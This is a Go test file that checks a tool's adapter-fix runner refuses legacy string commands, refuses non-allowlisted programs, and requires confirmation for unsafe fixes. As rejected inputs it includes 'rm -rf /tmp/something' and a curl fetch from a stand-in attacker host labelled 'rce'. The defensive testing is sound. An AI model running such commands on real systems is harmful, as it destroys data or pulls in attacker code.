package main

import (
	"strings"
	"testing"

	"github.com/sageox/ox/pkg/adapterprotocol"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestRunAdapterFix_RefusesLegacyStringFix is the load-bearing test
// for ox-saoy: an issue with only a Fix string (no FixArgv) must NOT
// be auto-executed, even with FixSafe=true and forceYes=true.
func TestRunAdapterFix_RefusesLegacyStringFix(t *testing.T) {
	issue := adapterprotocol.DiagnoseIssue{
		Slug:    "legacy",
		Fix:     "rm -rf /tmp/something",
		FixSafe: true,
	}
	err := runAdapterFix(issue, true /* forceYes */)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "FixArgv")
}

// TestRunAdapterFix_RefusesDisallowedArgv0 verifies that even with a
// structured argv, argv[0] outside the allowlist is rejected.
func TestRunAdapterFix_RefusesDisallowedArgv0(t *testing.T) {
	issue := adapterprotocol.DiagnoseIssue{
		Slug:    "rce",
		FixArgv: []string{"curl", "-fsSL", "https://attacker.example/x"},
		FixSafe: true,
	}
	err := runAdapterFix(issue, true)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "allowlist")
	assert.Contains(t, err.Error(), "curl")
}

// TestRunAdapterFix_AcceptsGitArgv verifies the allowlisted argv[0]="git"
// path actually runs (and an invalid subcommand fails through git's exit
// code rather than ox's allowlist).
func TestRunAdapterFix_AcceptsGitArgv(t *testing.T) {
	// `git --version` is a real argv that's trivially harmless and
	// always succeeds on any machine git is installed on.
	issue := adapterprotocol.DiagnoseIssue{
		Slug:    "harmless",
		FixArgv: []string{"git", "--version"},
		FixSafe: true,
	}
	err := runAdapterFix(issue, false /* forceYes */)
	require.NoError(t, err)
}

// TestRunAdapterFix_RequiresFixSafeOrForceYes verifies the unsafe gate.
func TestRunAdapterFix_RequiresFixSafeOrForceYes(t *testing.T) {
	issue := adapterprotocol.DiagnoseIssue{
		Slug:    "unsafe",
		FixArgv: []string{"git", "reset", "--hard"},
		FixSafe: false,
	}
	err := runAdapterFix(issue, false)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "confirmation")
}

// TestRunAdapterFix_StringsFieldsLossiness verifies the old strings.Fields
// splitter cannot be exploited even when the user has --yes set —
// the legacy code path is gone, so no quoted-argument confusion remains.
// This is a regression guard: if someone re-introduces strings.Fields, the
// test fails because the issue lacks FixArgv.
func TestRunAdapterFix_StringsFieldsLossiness(t *testing.T) {
	issue := adapterprotocol.DiagnoseIssue{
		Slug: "loss",
		// "rm 'a b'" — under the old splitter this became 3 args (rm, 'a, b').
		// Under the new contract it's a display-only string.
		Fix:     "rm 'a b'",
		FixSafe: true,
	}
	err := runAdapterFix(issue, true)
	require.Error(t, err)
	assert.True(t, strings.Contains(err.Error(), "FixArgv") || strings.Contains(err.Error(), "display-only"))
}
